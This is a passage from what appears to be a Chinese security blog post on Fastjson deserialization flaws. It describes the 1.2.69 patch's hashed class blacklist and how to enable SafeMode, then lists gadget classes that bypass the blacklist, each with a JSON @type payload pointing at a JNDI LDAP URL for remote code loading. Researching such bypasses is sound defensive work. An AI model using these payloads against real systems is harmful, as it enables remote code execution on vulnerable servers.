&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ZV6G8">补丁修复</h3>
在GitHub官方的diff，主要在ParserConfig.java中：

<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4">https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4</a></p>
<p>在expectClass的对比逻辑中，对类名进行了hash处理在比较hash黑名单，并添加了几个类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742225722469-b1709e8b-66f9-4c87-ad97-444f38b9a26b.png"></p>
<p>有人通过彩虹表碰撞，知道了其中新添加的三个类为如下</p>
<table>
<thead>
<tr>
<th><strong><font style="color:rgb(80, 80, 92);">版本</font></strong></th>
<th><strong><font style="color:rgb(80, 80, 92);">十进制Hash值</font></strong></th>
<th><strong><font style="color:rgb(80, 80, 92);">十六进制Hash值</font></strong></th>
<th><strong><font style="color:rgb(80, 80, 92);">类名</font></strong></th>
</tr>
</thead>
<tbody><tr>
<td><font style="color:rgb(80, 80, 92);">1.2.69</font></td>
<td><font style="color:rgb(80, 80, 92);">5183404141909004468L</font></td>
<td><font style="color:rgb(80, 80, 92);">0x47ef269aadc650b4L</font></td>
<td><font style="color:rgb(80, 80, 92);">java.lang.Runnable</font></td>
</tr>
<tr>
<td><font style="color:rgb(80, 80, 92);">1.2.69</font></td>
<td><font style="color:rgb(80, 80, 92);">2980334044947851925L</font></td>
<td><font style="color:rgb(80, 80, 92);">0x295c4605fd1eaa95L</font></td>
<td><font style="color:rgb(80, 80, 92);">java.lang.Readable</font></td>
</tr>
<tr>
<td><font style="color:rgb(80, 80, 92);">1.2.69</font></td>
<td><font style="color:rgb(80, 80, 92);">-1368967840069965882L</font></td>
<td><font style="color:rgb(80, 80, 92);">0xed007300a7b227c6L</font></td>
<td><font style="color:rgb(80, 80, 92);">java.lang.AutoCloseable</font></td>
</tr>
</tbody></table>
<h3 id="paOC8">SafeMode</h3>
官方的参考：[https://github.com/alibaba/fastjson/wiki/fastjson_safemode](https://github.com/alibaba/fastjson/wiki/fastjson_safemode)

<p>在1.2.68之后的版本中，fastjson添加了safeMode的支持</p>
<p>该参数开启后，完全禁用autoType。所有安全修复版本sec10也支持safeMode配置</p>
<p>代码中开启SafeMode代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setSafeMode(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>开启之后，就完全禁用<code>AutoType</code>即<code>@type</code>了，这样就能防御住Fastjson反序列化漏洞了。具体的处理逻辑，是放在<code>checkAutoType()</code>函数中的前面，获取是否设置了<code>SafeMode</code>，如果是则直接抛出异常终止运行</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742226095954-8dcd4d63-c233-44da-8255-69038f77625e.png"></p>
<h2 id="i8Gz2">其他一些绕过黑名单的Gadget</h2>
<h3 id="Ez1g2">1.2.59</h3>
com.zaxxer.hikari.HikariConfig类PoC：

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;或&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="g66pt">1.2.61</h3>
org.apache.commons.proxy.provider.remoting.SessionBeanProvider类PoC：

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span>,<span class="string">&quot;jndiName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,<span class="string">&quot;Object&quot;</span>:<span class="string">&quot;a&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="S7C1P">1.2.62</h3>
<font style="color:rgb(80, 80, 92);">org.apache.cocoon.components.slide.impl.JMSContentInterceptor类PoC：</font>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span>, <span class="string">&quot;parameters&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Hashtable&quot;</span>,<span class="string">&quot;java.naming.factory.initial&quot;</span>:<span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>,<span class="string">&quot;topic-factory&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;, <span class="string">&quot;namespace&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="MbKCt">1.2.68</h3>
<font style="color:rgb(80, 80, 92);">org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类PoC：</font>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;或&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(80, 80, 92);">com.caucho.config.types.ResourceRef类PoC：</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.caucho.config.types.ResourceRef&quot;</span>,<span class="string">&quot;lookupName&quot;</span>: <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="string">&quot;value&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.value&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="未知版本">未知版本</h3>
org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory类PoC：

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&quot;</span>, <span class="string">&quot;tmJndiName&quot;</span>: <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="string">&quot;tmFromJndi&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;transactionManager&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.transactionManager&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(80, 80, 92);">org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory类PoC：</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;</span>, <span class="string">&quot;tmJndiName&quot;</span>: <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="string">&quot;tmFromJndi&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;transactionManager&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.transactionManager&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>请我一杯咖啡吧！</div>
  <button>
    赞赏
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.jpg" alt="Sean 微信">
        <span>微信</span>
      </div>
      <div>
        <img src="/images/alipay.jpg" alt="Sean 支付宝">
        <span>支付宝</span>
      </div>

  </div>
</div>

          <div class="post-tags">
              <a href="/tags/FastJson/" rel="tag"># FastJson</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/03/23/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" rel="prev" title="EL表达式注入">
                  <i class="fa fa-angle-left"></i> EL表达式注入
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/03/25/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" rel="next" title="SPEL表达式注入">
                  SPEL表达式注入 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>





</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Sean</span>
  </div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
